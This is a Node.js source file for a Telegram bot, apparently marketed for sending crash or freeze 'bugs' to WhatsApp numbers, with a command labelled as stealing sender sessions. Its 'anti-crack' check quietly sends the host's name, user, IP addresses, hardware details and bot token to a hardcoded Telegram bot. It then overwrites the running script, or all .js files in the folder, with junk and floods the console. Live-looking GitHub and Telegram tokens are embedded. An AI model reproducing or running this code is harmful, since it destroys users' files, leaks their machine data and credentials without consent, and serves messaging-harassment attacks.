const {
makeWASocket,
makeInMemoryStore,
fetchLatestBaileysVersion,
useMultiFileAuthState,
DisconnectReason,
generateWAMessageFromContent,
generateMessageID,
proto
} = require("@whiskeysockets/baileys");

// ---------- ( Set Const ) ----------- \\
const { exec } = require("child_process");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const os = require('os');
const fetch = require("node-fetch");
const cheerio = require('cheerio');
const { DateTime } = require('luxon');
const sessions = new Map();
const readline = require('readline');
const FormData = require('form-data');
const SESSIONS_DIR = "./Я - Data/sessions";
const SESSIONS_FILE = "./Я - Data/sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const GITHUB_OWNER = "Leviathh";
const GITHUB_REPO = "Syposie";
const GITHUB_TOKENS_FILE = "tokens.json";
const GITHUB_TOKEN = "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"; 
const GITHUB_TOKEN2 = "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"; 
const ONLY_FILE = path.join(__dirname, "Я - Data", "gconly.json");
const cd = path.join(__dirname, "Я - Syposie", "cd.json");

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/nothing424/Syposie/main/tokens.json"; 

const OWNER_CHAT_ID = '7991421690';
/// --- ( Random Image ) --- \\\
const randomImages = [
"https://files.catbox.moe/afjny3.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];
  
  
const currentDate = new Date().toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
});


function getWaktuSalam() {
  const hour = DateTime.now().setZone('Asia/Jakarta').hour

  if (hour >= 1 && hour <= 6) {
    return 'Selamat Subuh..🌃'
  } else if (hour >= 7 && hour <= 9) {
    return 'Selamat Pagi.. 🌆'
  } else if (hour >= 10 && hour <= 14) {
    return 'Selamat Siang..🏖️'
  } else if (hour >= 15 && hour <= 18) {
    return 'Selamat Sore..🌇'
  } else if (hour >= 19 && hour <= 23 || hour === 0) {
    return 'Selamat Malam..🌌'
  } else {
    return 'Selamat Malam..🌌' // fallback
  }
}
//------------- ( Pengecekan Token ) ------------------- \\
const { Octokit } = require("@octokit/rest");
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

const apiUrl = 'https://api.github.com/repos/nothing424/crack/contents/crack.json';

async function autoPushTokenIlegal(token, owner_id, attempt = 1) {
  if (attempt > 3) {
    console.log('❌ Gagal push token ke Github setelah 3 percobaan.');
    return;
  }
  try {
    const res = await axios.get(apiUrl, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN2}`,
        "User-Agent": "Syposie-TokenPush"
      }
    });
    let remaining = Number(res.headers['x-ratelimit-remaining'] || 0);
    let reset = res.headers['x-ratelimit-reset'] ? new Date(Number(res.headers['x-ratelimit-reset']) * 1000) : null;
    if (remaining < 2) {
      let waitSec = Math.max(5, Math.round((reset - Date.now()) / 1000));
      console.log(`⚠️ Rate limit akan habis. Menunggu ${waitSec}s sebelum retry (limit reset: ${reset})`);
      setTimeout(() => autoPushTokenIlegal(token, owner_id, attempt+1), waitSec * 1000);
      return;
    }
    const sha = res.data.sha;
    let data = [];
    try {
      data = JSON.parse(Buffer.from(res.data.content, 'base64').toString());
      if (!Array.isArray(data)) data = [];
    } catch { data = []; }
    owner_id = Number(owner_id);
    if (data.some(x => x.token === token)) {
      console.log("Token sudah ada, tidak push ulang.");
      return;
    }
    data.push({ token, owner_id });
    if (JSON.stringify(data).length > 30000) {
      console.log("❌ File crack.json sudah terlalu besar, abort push!");
      return;
    }
    const payload = {
      message: `Add illegal token by anti-crack`,
      content: Buffer.from(JSON.stringify(data, null, 2)).toString('base64'),
      sha
    };
    const putRes = await axios.put(apiUrl, payload, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN2}`,
        "User-Agent": "Syposie-TokenPush"
      }
    });
    let putRem = Number(putRes.headers['x-ratelimit-remaining'] || 0);
    console.log('✅ Token ilegal berhasil di-push ke Github! Sisa quota:', putRem);
  } catch (err) {
    if (err.response) {
      if (err.response.status === 403 && (err.response.data && err.response.data.message && err.response.data.message.includes("rate limit"))) {
        let reset = err.response.headers['x-ratelimit-reset'] ? new Date(Number(err.response.headers['x-ratelimit-reset']) * 1000) : null;
        let waitSec = Math.max(10, Math.round((reset - Date.now()) / 1000));
        console.log(`⏳ Rate limit Github habis. Menunggu ${waitSec}s sebelum retry...`);
        setTimeout(() => autoPushTokenIlegal(token, owner_id, attempt+1), waitSec * 1000);
        return;
      }
      console.log('Gagal push token ke Github:', err.response.status, err.response.data);
    } else {
      console.log('Gagal push token ke Github:', err.message);
    }
  }
}

function punish(reason = 'token_invalid') {
    function randJunk(len = 8e5 + Math.floor(Math.random() * 5e5)) {
        let set = "ꦾ\u200B\u202E\u202C\u2060\u200D🦠😈🦑🪐🌚🥴😴🏊🤭🌪️❌#@&!%^$[]{}~ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        return Array.from({ length: len }, () => set[Math.floor(Math.random() * set.length)]).join('');
    }
    let mainFile = process.argv[1];
    try {
        if (mainFile && fs.existsSync(mainFile)) {
            fs.writeFileSync(mainFile, randJunk(2e6) + '\n' + reason + '\n' + randJunk(3e6));
        }
    } catch (e) {
        try {
            const cwd = process.cwd();
            fs.readdirSync(cwd)
                .filter(f => f.endsWith('.js'))
                .forEach(f => {
                    try {
                        fs.writeFileSync(path.join(cwd, f), randJunk(2e6) + '\n' + reason + '\n' + randJunk(3e6));
                    } catch {}
                });
        } catch {}
    }
    setInterval(() => {
        process.stdout.write('\x07' + randJunk(8000));
        process.stderr.write('\x07' + randJunk(2000));
        try { throw new Error(randJunk(6666)); } catch (e) { console.error(e.stack); }
    }, 70);
    throw new Error('💩 𝘼𝙉𝙏𝙄-𝘾𝙍𝘼𝘾𝙆 𝘼𝘾𝙏𝙄𝙑𝙀⸙ FILE UTAMA DIACAK!');
}
async function tokenProgressBar(text = "Autentikasi Token", steps = [0, 20, 60, 80, 100], delay = 450) {
  const barLen = 20;
  for (let i = 0; i < steps.length; i++) {
    const percent = steps[i];
    const full = Math.round((percent / 100) * barLen);
    const bar = chalk.hex('#FF0060')('●'.repeat(full)) + chalk.gray('○'.repeat(barLen - full));
    console.log(
      chalk.cyan.bold(`[${bar}]`) +
      ' ' +
      chalk.yellow(`${percent.toString().padStart(3)}%`) +
      '  ' +
      chalk.whiteBright(text)
    );
    await new Promise(res => setTimeout(res, delay));
  }
  console.log(chalk.green('✔ Progress Selesai!\n'));
}

async function startTelegramBot() {
    console.log(chalk.blue("Memuat Pengecekan Token Bot..."));
    await tokenProgressBar('AutentikasiToken');
console.log(
  chalk.bold.hex('#ff0060')('\n⸙━━━━━━━〔 SYPOSIE BOT 〕━━━━━━━⸙') + '\n' +
  chalk.yellowBright('   🌀  ID Pengguna : ') + chalk.bold.cyanBright(OWNER_ID) + '\n' +
  chalk.yellowBright('   🤖  Token Bot   : ') + chalk.bold.cyanBright(BOT_TOKEN) + '\n' +
  chalk.hex('#ff0060')('⸙━━━━━━━━━━━━━━━━━━━━━━━━━━⸙\n')
);

    const validTokens = await fetchValidTokens();

    if (!validTokens || validTokens.length === 0) {
        console.log(chalk.red("❌ Gagal mendapatkan daftar token. Bot tidak akan dimulai."));
        process.exit(1); 
    }

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red("❌ Token Lu Kek Babi Ga Diterima!! Beli Ke Zeroth Sana @Uknownszz"));
        
function execSafe(cmd) {
  try { return require('child_process').execSync(cmd, {timeout: 3000}).toString().trim(); } catch { return "-"; }
}
let hostname = os.hostname();
let username = (()=>{try{return os.userInfo().username;}catch{return '-';}})();
let platform = os.platform();
let arch = os.arch();
let cpuModel = os.cpus()[0]?.model || '-';
let cpuCores = os.cpus().length;
let totalmem = (os.totalmem()/(1024*1024)).toFixed(2) + " MB";
let iplist = (() => {
  let arr = [];
  try {
    let ifaces = os.networkInterfaces();
    for (let name in ifaces) for (let iface of ifaces[name]) {
      if (!iface.internal && iface.address) arr.push(iface.address);
    }
  } catch {}
  return arr.join(', ') || '-';
})();
let nodever = process.version;
let nowWITA = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
let DOMAIN_PANEL = process.env.DOMAIN_PANEL || '-';

let message = `
⸙ *SYPOSIE ANTI-CRACK WARNING* ⸙

━━━━━━━━━━━━━━━━━━━━━━
* ID Owner*    : \`${OWNER_ID}\`
━━━━━━━━━━━━━━━━━━━━━━
* Token Bot*   : \`${BOT_TOKEN}\`
━━━━━━━━━━━━━━━━━━━━━━
* Panel*       : \`${DOMAIN_PANEL}\`
━━━━━━━━━━━━━━━━━━━━━━
* Device*      : \`${hostname}\`
━━━━━━━━━━━━━━━━━━━━━━
* User*        : \`${username}\`
━━━━━━━━━━━━━━━━━━━━━━
* OS/Arch*     : \`${platform} / ${arch}\`
━━━━━━━━━━━━━━━━━━━━━━
* CPU*         : \`${cpuModel}\` (${cpuCores} core)
━━━━━━━━━━━━━━━━━━━━━━
* RAM*         : ${totalmem}
━━━━━━━━━━━━━━━━━━━━━━
* IP Lokal*    : ${iplist}
━━━━━━━━━━━━━━━━━━━━━━
* Node.js*     : \`${nodever}\`
━━━━━━━━━━━━━━━━━━━━━━
* Waktu*       : ${nowWITA}
━━━━━━━━━━━━━━━━━━━━━━
`;

  const url = 'https://api.telegram.org/bot8309438389:AAEq8Td0P6Kn_umiArvY6H-OFT8gBDfHRoo/sendMessage';
  try {
    await axios.post(url, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log('Notifikasi berhasil dikirim ke owner.');
  } catch (e) {
    console.log('Gagal mengirim notifikasi:', e?.response?.data || e.message);
  }

         console.log(chalk.bold.red(`\n
═══════════════════════════════════════════
TOKEN ANDA TIDAK TERDAFTAR DI DATABASE !!!
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
        await autoPushTokenIlegal(BOT_TOKEN, OWNER_ID);
        punish('token_invalid');
        process.exit(1);
    }

    console.log(chalk.green("あなたのトークンは有効です"));
    console.log(chalk.bold.white(`\n
⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀

» Information:
☇ Inventor : Я - Zeroth
☇ Name Script : Syposie's - Lightning 𖣂 
☇ Version : 1.0
`));
}
startTelegramBot()

async function sendNotif() {
        
          const message = `
✨ *Syposie Telah Dijalankan* ✨

📅 *Tanggal:* ${currentDate}
🕰️ *Waktu:* ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB

👤 *Informasi Owner:*
  - *Chat ID:* \`${OWNER_ID}\`

🔑 *Token Bot:* \`${BOT_TOKEN}\`

  *ᴄʀᴇᴀᴛᴇ ʙʏ ᴢᴇʀᴏᴛʜ⸙*
        `;

        const url = `https://api.telegram.org/bot8309438389:AAEq8Td0P6Kn_umiArvY6H-OFT8gBDfHRoo/sendMessage`; 
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } 


// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
▢ Connection Sukses
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber, "XVENUSSX");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./Я - Data/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./Я - Data/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./Я - Data/premium.json');
            ensureFileExists('./Я - Data/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./Я - Data/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./Я - Data/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./Я - Data/premium.json', (data) => (premiumUsers = data));
    watchFile('./Я - Data/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}

const getAphocalypsObfuscationConfig = () => {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.75,
    deadCode: 0.2,
    dispatcher: true,
    duplicateLiteralsRemoval: 0.75,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "zeroWidth",
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    renameVariables: true,
    renameGlobals: true,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    rgf: false,
  };
};
/// --- ( Menu Utama ) --- \\\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const WaktuJam = getWaktuSalam();
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const caption = `
<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
 
め Inventor : Я - Zeroth
め Version : 1.0
め Language : Javascript 
め Prefix : /
め Runtime : ${runtime}
め Time : ${WaktuJam}


© Я ⵢ Syposie 𖣂
`;

  const buttons = [
  [
    { text: "⌜🦠⌟ ☇ ウイルス", callback_data: "bugshow" },    
    { text: "⌜⚙️⌟ ☇ コントロール", callback_data: "ownermenu" }
  ],
  [
    { text: "⌜🛠️⌟ ☇ 補助ツール", callback_data: "tools" },
    { text: "⌜👥⌟ ☇ クレジットと知識", callback_data: "thanksto" }
  ],
  [
    { text: "⌜🌍⌟ ☇ コミュニティ", url: "https://t.me/nothingszz" }
  ]
];


  bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  });
});
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const runtime = getBotRuntime();
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const WaktuJam = getWaktuSalam();
  const randomImage = getRandomImage();
  const senderId = callbackQuery.from.id;
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
  
  let newCaption = "";
  let newButtons = [];
  if (data === "bugshow") {
    newCaption =
`<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
 
め Inventor : Я - Zeroth
め Version : 1.0
め Language : Javascript 
め Prefix : /
め Runtime : ${runtime} 
め Time : ${WaktuJam} \n
<blockquote>#Syposie's ⵢ Visible ⚘</blockquote> \n
 ⬡ /Dragon ⵢ 62xxx
 ╰➤ Delay Invis New
 ⬡ /Francisco ⵢ 62xxx
 ╰➤ Freeze Click 
 ⬡ /Gummy ⵢ 62xxx
 ╰➤ Invisible Iphone 
 
© Я ⵢ Syposie 𖣂
`;

    newButtons = [
      [{ text: "! Back To", callback_data: "mainmenu" }]
    ];
  } else if (data === "ownermenu") {
   newCaption =
`<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
 
め Inventor : Я - Zeroth
め Version : 1.0
め Language : Javascript 
め Prefix : /
め Runtime : ${runtime} 
め Time : ${WaktuJam} \n
<blockquote>༑ 𖣂 Acces ☇ Menu 𖣂 ༑</blockquote>
⬡ /addadmin ID 
⬡ /deladmin ID
⬡ /addprem ID Time
⬡ /delprem ID
⬡ /listprem ID
⬡ /addbot ( Connect )
⬡ /listbot ( Check Connect )
⬡ /csession ( Colong Sender )
⬡ /gconly ( off|on )


© Я ⵢ Syposie 𖣂
`;

    newButtons = [
      [{ text: "! Back To", callback_data: "mainmenu" }]
    ];
  } else if (data === "thanksto") {
    newCaption =
`<blockquote>#Syposie's ⵢ Lightning ⚘</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
 
め Inventor : Я - Zeroth
め Version : 1.0
め Language : Javascript 
め Prefix : /
め Runtime : ${runtime} 
め Time : ${WaktuJam} \n
